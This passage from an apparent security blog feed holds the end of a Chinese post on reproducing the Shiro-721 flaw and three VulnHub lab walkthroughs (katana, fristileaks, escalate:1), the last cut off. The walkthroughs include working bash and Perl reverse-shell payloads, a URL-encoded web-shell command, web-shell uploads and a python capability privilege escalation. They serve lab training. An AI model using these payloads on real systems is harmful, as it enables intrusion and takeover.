<br><span class="hljs-attribute">1</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-RC2,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>漏洞原理<br>Shiro使用了AES-128-CBC模式对cookie进行加密，导致恶意用户可以通过Padding Oracle攻击方式构造序列化数据进行反序列化攻击,例如SHIRO-550。(Shiro-721)<br>环境搭建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/inspiringz/Shiro-721.git<br><span class="hljs-built_in">cd</span> Shiro-721/Docker<br>docker build -t shiro-721 .<br>docker run -p 8080:8080 -d shiro-721<br></code></pre></td></tr></table></figure><p>访问ip:8080<br><img src="https://i.ibb.co/qL6ZYJPD/image.png"><br>可参考<a href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a> 手工利用<br><img src="https://i.ibb.co/cKp5x2zz/image.png"><br>我是脚本小子直接利用工具一把梭<br><img src="https://i.ibb.co/TM15gPGW/image.png"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp katana</title>
    <link href="/vulnhub-wp-katana/"/>
    <url>/vulnhub-wp-katana/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-host-discover"><a href="#🖳-host-discover" class="headerlink" title="🖳 host discover"></a>🖳 host discover</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.213.0/24<br>Currently scanning: 192.168.213.0/24   |   Screen View: Unique Hosts                                                                                                <br> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                             <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.213.1   00:50:56:c0:00:08      1      60  VMware, Inc.                   <br> 192.168.213.2   00:50:56:ed:a6:8f      1      60  VMware, Inc.                   <br> 192.168.213.129 00:0c:29:3f:3b:78      1      60  VMware, Inc.                   <br> 192.168.213.254 00:50:56:e3:da:55      1      60  VMware, Inc.             <br></code></pre></td></tr></table></figure><p>target was <code>192.168.213.129</code></p><h1 id="👁-service-scan"><a href="#👁-service-scan" class="headerlink" title="👁 service scan"></a>👁 service scan</h1><p>nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- -sV -sC -Pn -oN nmap --min-rate 8000 192.168.213.129<br>···<br>PORT     STATE SERVICE     VERSION<br>21/tcp   open  ftp         vsftpd 3.0.3<br>22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:<span class="hljs-built_in">fc</span>:60:a6:de:35 (RSA)<br>|   256 <span class="hljs-built_in">dd</span>:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)<br>|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)<br>80/tcp   open  http        Apache httpd 2.4.38 ((Debian))<br>|_http-title: Katana X<br>|_http-server-header: Apache/2.4.38 (Debian)<br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)<br>7080/tcp open  ssl/http    LiteSpeed httpd<br>| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US<br>| Not valid before: 2020-05-11T13:57:36<br>|_Not valid after:  2022-05-11T13:57:36<br>|_http-title: Katana X<br>| tls-alpn: <br>|   h2<br>|   spdy/3<br>|   spdy/2<br>|_  http/1.1<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>|_http-server-header: LiteSpeed<br>8088/tcp open  http        LiteSpeed httpd<br>|_http-server-header: LiteSpeed<br>|_http-title: Katana X<br>8715/tcp open  http        nginx 1.14.2<br>|_http-title: 401 Authorization Required<br>|_http-server-header: nginx/1.14.2<br>| http-auth: <br>| HTTP/1.1 401 Unauthorized\x0D<br>|_  Basic realm=Restricted Content<br>MAC Address: 00:0C:29:3F:3B:78 (VMware)<br>Service Info: Host: KATANA; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2024-03-31T02:02:39<br>|_  start_date: N/A<br>|_nbstat: NetBIOS name: KATANA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.9.5-Debian)<br>|   Computer name: katana<br>|   NetBIOS computer name: KATANA\x00<br>|   Domain name: \x00<br>|   FQDN: katana<br>|_  System time: 2024-03-30T22:02:39-04:00<br>···<br></code></pre></td></tr></table></figure><p>there was lots of service, let’s try one by one!</p><h1 id="🚪🚶-get-shell"><a href="#🚪🚶-get-shell" class="headerlink" title="🚪🚶 get shell"></a>🚪🚶 get shell</h1><p><em>21</em><br>there was not allow anonymous to login, so try other service<br><em>22</em> we dont have cred<br><em>80</em><br>brute path</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.213.129 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o 80.out -t 50<br>/.htm                 (Status: 403) [Size: 279]<br>/.php                 (Status: 403) [Size: 279]<br>/.                    (Status: 200) [Size: 655]<br>/.htaccess            (Status: 403) [Size: 279]<br>/.phtml               (Status: 403) [Size: 279]<br>/ebook                (Status: 301) [Size: 316] [--&gt; http://192.168.213.129/ebook/]<br>/.htc                 (Status: 403) [Size: 279]<br>/.html_var_DE         (Status: 403) [Size: 279]<br>/server-status        (Status: 403) [Size: 279]<br>/.htpasswd            (Status: 403) [Size: 279]<br></code></pre></td></tr></table></figure><p>nice, there was a ebook path!<br>it was a book store cms, there was two path to get shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9fee67f690cc494cf5198.png"></p><ul><li>login admin and add book, and upload a shell</li><li>use exploit<br>it all fail. fot first, it seems cant write file into the img path.<br>second,it fail too.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 47887.py http://192.168.213.129/ebook<br>/home/rightevil/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn<span class="hljs-string">&#x27;t match a supported version!</span><br><span class="hljs-string">  warnings.warn(&quot;urllib3 (&#123;&#125;) or chardet (&#123;&#125;)/charset_normalizer (&#123;&#125;) doesn&#x27;</span>t match a supported <span class="hljs-string">&quot;</span><br><span class="hljs-string">&gt; Attempting to upload PHP web shell...</span><br><span class="hljs-string">&gt; Verifying shell upload...</span><br><span class="hljs-string">&gt; Web shell failed to upload! The web server may not have write permissions.</span><br></code></pre></td></tr></table></figure>try another port</li></ul><p><em>smb</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //192.168.213.129      <br>Password <span class="hljs-keyword">for</span> [WORKGROUP\rightevil]:<br><br>Sharename       Type      Comment<br>---------       ----      -------<br><span class="hljs-built_in">print</span>$          Disk      Printer Drivers<br>IPC$            IPC       IPC Service (Samba 4.9.5-Debian)<br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br><br>Server               Comment<br>---------            -------<br>Workgroup            Master<br>---------            -------<br>WORKGROUP            KATANA<br></code></pre></td></tr></table></figure><p>nothings, and we could use enum4linux to enum user.(user:kanata)<br><em>7080</em><br>it’s a rabbit hole<br>nothing<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9cfa819edad301b9fb320.png"><br>all the page was 403<br><em>8088</em><br>dir brute</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.213.129:8088/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 50    <br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.213.129:8088/<br>[+] Method:                  GET<br>[+] Threads:                 50<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/cgi-bin              (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/cgi-bin/]<br>/css                  (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/css/]<br>/img                  (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/img/]<br>/docs                 (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/docs/]<br>/.                    (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/./]<br>/.htaccess            (Status: 403) [Size: 1227]<br>/protected            (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/protected/]<br>/blocked              (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/blocked/]<br>Progress: 43007 / 43008 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>yes, the docs was the manual guide page about <code>OpenLiteSpeed Web Server 1.5</code>, but i dont find the exploit about it.<br>let’s search page</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.213.129:8088/  -x txt,php,html --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -t 50<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b0a9e1ebdd1f722de8b3a.png"><br>there was a upload.html<br>after trying, we could upload php file in it, but we it seems dont show in port 8088<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/859db8f34196741dfea2d.png"><br>but it was a web page too(cause /html), so let’s try other port<br><em>8715</em><br>it have a get login, and we could login by <code>admin:admin</code><br>and our backdoor was in this port!<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d0f3004b7f1cb5936ad3d.png"><br>let’s connect to it by weevely(i generate the backdoor by weevely).<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5551bff43abf3c0b9fd33.png"><br>if u want,u could reverse a stable shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.213.128/443 0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="🛡️-PE"><a href="#🛡️-PE" class="headerlink" title="🛡️ PE"></a>🛡️ PE</h1><p>in /home/kanata, we find kanata’s passwd, and there was root’s hash in /etc/passwd.<br>but kanata dont have sudo or other, and we couldn’t crack the root’s hash<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a4331a194c20d80939e1c.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/32c460295232f487fec5f.png"><br>finally, we find a cap file by linpeas.sh<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7942c6cdc6adac4d12bc3.png"><br>so get root shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d1a64976d90b93131c3f1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/python2.7 -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;);&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/82e02b691dc2269b66312.png"></p><h1 id="📖-recommend-article"><a href="#📖-recommend-article" class="headerlink" title="📖 recommend article"></a>📖 recommend article</h1><p><a href="https://zweilosec.gitbook.io/hackers-rest/linux-1/linux-redteam/privilege-escalation#privilege-escalation-using-file-capabilities">PE about file capabilities</a><br><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">PE about file capabilities in hacktricks</a><br><a href="https://www.vulnhub.com/entry/katana-1,482/">katana vulnhub download</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp fristileaks:1.3</title>
    <link href="/vulnhub-wp-fristileaks-1-3/"/>
    <url>/vulnhub-wp-fristileaks-1-3/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-host-discover"><a href="#🖳-host-discover" class="headerlink" title="🖳 host discover"></a>🖳 host discover</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.165.0/24<br>Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                          <br>                                                                                                                                                                       <br>3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                        <br>_____________________________________________________________________________<br>  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br>-----------------------------------------------------------------------------<br>192.168.165.14  96:89:78:52:9c:12      1      60  Unknown vendor                                                                                                       <br>192.168.165.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                                                                                      <br>192.168.165.240 08:00:27:a5:a6:76      1      60  PCS Systemtechnik GmbH               <br></code></pre></td></tr></table></figure><p>target was <em>192.168.165.240</em></p><h1 id="👁-service-scan"><a href="#👁-service-scan" class="headerlink" title="👁 service scan"></a>👁 service scan</h1><p>nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV -sC -Pn -oN nmap --min-rate 8000 192.168.165.240<br>···<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)<br>| http-robots.txt: 3 disallowed entries <br>|_/cola /sisi /beer<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">| http-methods: </span><br><span class="hljs-string">|_  Potentially risky methods: TRACE</span><br><span class="hljs-string">|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</span><br><span class="hljs-string">MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">···</span><br></code></pre></td></tr></table></figure><p>there was only 80</p><h1 id="🚪🚶-get-shell"><a href="#🚪🚶-get-shell" class="headerlink" title="🚪🚶 get shell"></a>🚪🚶 get shell</h1><p>in robots, we find three same path,all show a image,so let’s get back to index, it shows we need drink fristi, and there was the drink name in robots, so if the fristi was a path?<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/01fab52c842d47cbd9912.png"><br>and it was!<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0403d2b25fdf668618999.png"><br>it was a login page,there was a username and a base64 data.<br>after decode it, it seems a png<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d4eadba357482da4cff46.png"><br>did it was a pass?<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2d98c7edd1d22322a7d57.png"><br>yes. and we could login it by <code>eezeepz:KeKKeKKeKKeKKEKKEK</code><br>and we find a upload.php, let’s upload a backdoor into it.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ed5fe3024b6fab5c591cd.png"><br>after trying, we could upload it by change content/type and filename.<br>try to connect it!<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4d3bfeaab97b43c68f3fe.png"><br>we got a normal shell.<br>we got a hints in eezeepz’s home<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7d79a299be313448dcd68.png"><br>but we dont have w in /home/admin, and there dont have bash or sh in/usr/bin/, so i chmod 777 to /home/admin, and copy a bash in it, and bound shell.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4245ecac6bee899794c54.png"><br>and copy a bash to it.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b59150459845457933261.png"></p><h1 id="🛡️-PE"><a href="#🛡️-PE" class="headerlink" title="🛡️ PE"></a>🛡️ PE</h1><p>now we have admin’s shell and find a encode file<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ae021d374305e2ba1d1e8.png"><br>so let’s decode it.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/27f9259497ff072ebac7e.png"><br>it was admin’s password,after trying<br>and there was another encode str,after we decode it and trying, it was the password of fristigod<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b545e29dc4221e1578bcb.png"><br>and we su this user, and find this user have sudo<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2004968abb7ed38b02dd7.png"><br>and get root shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ad35b3a96b21278512b28.png"></p><h1 id="📖-recommend-article"><a href="#📖-recommend-article" class="headerlink" title="📖 recommend article"></a>📖 recommend article</h1><p><a href="https://infosecwriteups.com/vulnhub-fristileaks-1-3-walkthrough-994d7770d363">another walkthrough</a><br><a href="https://www.vulnhub.com/entry/fristileaks-13,133/">fristileaks download</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp escalate:1</title>
    <link href="/vulnhub-wp-escalate-1/"/>
    <url>/vulnhub-wp-escalate-1/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-host-discover"><a href="#🖳-host-discover" class="headerlink" title="🖳 host discover"></a>🖳 host discover</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.165.0/24<br>Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                          <br>                                                                                                                                                                        <br> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                        <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.165.14  c6:3b:70:2b:33:1e      1      60  Unknown vendor                                                                                                       <br> 192.168.165.60  08:00:27:ea:fe:25      1      60  PCS Systemtechnik GmbH                                                                                               <br> 192.168.165.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate       <br></code></pre></td></tr></table></figure><p>target was <em>192.168.165.60</em></p><h1 id="👁-service-scan"><a href="#👁-service-scan" class="headerlink" title="👁 service scan"></a>👁 service scan</h1><p>nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV -sC -Pn -oN nmap --min-rate 8000 192.168.165.60<br>···<br>PORT      STATE SERVICE     VERSION<br>80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>111/tcp   open  rpcbind     2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100003  3           2049/udp   nfs<br>|   100003  3           2049/udp6  nfs<br>|   100003  3,4         2049/tcp   nfs<br>|   100003  3,4         2049/tcp6  nfs<br>|   100005  1,2,3      39060/udp   mountd<br>|   100005  1,2,3      39568/udp6  mountd<br>|   100005  1,2,3      52275/tcp   mountd<br>|   100005  1,2,3      53503/tcp6  mountd<br>|   100021  1,3,4      33553/tcp6  nlockmgr<br>|   100021  1,3,4      39193/tcp   nlockmgr<br>|   100021  1,3,4      53493/udp   nlockmgr<br>|   100021  1,3,4      56884/udp6  nlockmgr<br>|   100227  3           2049/tcp   nfs_acl<br>|   100227  3           2049/tcp6  nfs_acl<br>|   100227  3           2049/udp   nfs_acl<br>|_  100227  3           2049/udp6  nfs_acl<br>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br>2049/tcp  open  nfs         3-4 (RPC <span class="hljs-comment">#100003)</span><br>35337/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>39193/tcp open  nlockmgr    1-4 (RPC <span class="hljs-comment">#100021)</span><br>52275/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>56035/tcp open  mountd      1-3 (RPC <span class="hljs-comment">#100005)</span><br>MAC Address: 08:00:27:EA:FE:25 (Oracle VirtualBox virtual NIC)<br>Service Info: Host: LINUX<br>···<br></code></pre></td></tr></table></figure><h1 id="🚪🚶-get-shell"><a href="#🚪🚶-get-shell" class="headerlink" title="🚪🚶 get shell"></a>🚪🚶 get shell</h1><p>path brute</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.165.60 -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.165.60<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/shell.php            (Status: 200) [Size: 29]<br>Progress: 5163 / 5164 (99.98%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>find a webshell page,bound shell!<br>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;192.168.165.130&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;bash -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><p>url encode-&gt;final payload(<code>https://www.urlencoder.org/</code>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.165.60/shell.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.165.130%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22bash%20-i%22%29%3B%7D%3B%27<br></code></pre></td></tr></table></figure><h1 id="🛡️-PE"><a href="#🛡️-PE" class="headerlink" title="🛡️ PE"></a>🛡️ PE</h1><h2 id="No-1-user3-shell-PE"><a href="#No-1-user3-shell-PE" class="headerlink" title="No.1 user3/shell PE"></a>No.1 user3/shell 